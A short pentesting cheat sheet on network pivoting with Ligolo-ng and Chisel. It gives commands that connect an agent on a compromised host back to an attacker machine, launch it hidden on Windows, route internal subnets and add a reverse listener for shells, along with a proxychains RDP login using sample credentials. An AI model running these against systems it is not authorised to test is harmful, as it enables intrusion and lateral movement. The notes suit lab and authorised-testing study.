---
icon: lucide/scroll-text
---

# Tunneling

## Ligolo-ng

> Github: https://github.com/nicocha30/ligolo-ng

Ligolo-ng is my prefered tunnel now because it works on Layer 3, so I'm able to user more than just TCP (e.g., I can ping hosts on the other subnet, nmap UDP scan, etc.)

``` text
# Start proxy (attack)
./proxy -selfcert -laddr 0.0.0.0:11601

# On agent (pivot)
./agent -connect 10.10.14.4:11601 -ignore-cert

# If agent is windows evil-winrm, sometimes it dies. Do this instead:
Start-Process -FilePath "C:\Windows\Temp\ligolo-ng-agent-windows_amd64.exe" -ArgumentList "-connect 172.16.139.10:11601 -ignore-cert" -WindowStyle Hidden

# In proxy console
session → pick agent → ifconfig → start

# Route internal subnet
sudo ip route add 172.16.139.0/24 dev ligolo

# If you want to access the agent's loopback interface, we can do that with this,
# and then 240.0.0.1 is the same as 127.0.0.1 for the agent
sudo ip route add 240.0.0.1/32 dev ligolo

# Adding a reverse listener on proxy (attack side)
» listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444 --tcp

```

## Chisel

> Github: https://github.com/jpillora/chisel

Adding Chisel here just in case Ligolo doesn't work.

``` text
# Using reverse tunnel for this. In attack:
sudo ./chisel server --reverse -v -p 1234 --socks5

# In pivot host
./chisel client -v <attack_ip>:1234 R:socks

# Make sure /etc/proxychains.conf has socks5 (and socks4 is commented out)
socks5 127.0.0.1 1080

# Now use proxychains to target the new subnet
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
